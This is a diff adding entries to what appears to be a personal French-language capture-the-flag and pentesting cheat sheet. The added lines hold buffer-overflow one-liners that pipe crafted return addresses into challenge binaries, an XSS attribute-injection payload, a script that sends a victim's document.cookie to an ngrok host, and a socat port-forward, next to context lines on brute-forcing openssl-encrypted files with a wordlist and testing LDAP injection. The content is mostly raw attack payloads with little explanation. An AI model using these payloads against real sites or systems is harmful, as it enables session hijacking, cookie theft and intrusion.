@@ -65,7 +65,12 @@ examples :
 	(python -c 'print chr(0x08)*4 + "\xbc\xfa\xff\xbf"' ; cat ) | ./ch16
 	-- x86 chr() pour ecrire de l'hexa --
 
-
+examples:
+	- { python -c 'from struct import pack; print "B" * 280 + pack("<Q", 0x400556)'; cat } | ./binaire 
+	- ( python -c 'print chr(0x08)*4 + "\xbc\xfa\xff\xbf"' ; cat) | binaire
+			      ^
+			  write hexa
+	
 
 ------------------------------------------------------------------------------------------
          			  BASH
@@ -123,7 +128,21 @@ bruteforce-salted-openssl -t 6 -f ~/Téléchargements/rockyou.txt -c AES-256-CBC
 Encoder en openssl
 openssl enc -in LEFICHIERDENTREE -out LEFICHIERDESORTIE -d -AES-256-CBC -md sha256 -pass 'pass:LEPASSQUETATROUVE'
 
+------------------------------------------------------------------------------------------
+				XSS
+------------------------------------------------------------------------------------------
+
+"onfocus="alert(1)"autofocus="
+
+ ----- NGROK -----
+<script>window.location.href='http://ngrok.io/?cookie='+document.cookie</script>
+						   or  v
+						      %2b
+
+
 --------------------------DIVERS------------------------------
+
+socat tcp-listen:2222, fork tcp 192.168.100.12:22
 
 LDAP injection tester username avec ) si error username=* pass=*)(& 
 
